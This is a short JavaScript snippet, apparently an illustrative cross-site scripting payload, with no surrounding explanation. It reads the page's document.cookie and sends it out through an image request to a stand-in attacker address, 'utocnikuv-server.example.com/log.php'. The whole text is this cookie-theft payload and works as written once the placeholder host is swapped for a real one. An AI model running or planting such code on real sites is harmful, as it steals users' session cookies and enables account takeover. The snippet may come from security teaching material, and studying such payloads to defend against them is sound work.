
  var attackerServer = 'https://utocnikuv-server.example.com/log.php';

  var stolenData = document.cookie;

  var img = new Image();

  img.src = attackerServer + '?data=' + encodeURIComponent(stolenData);
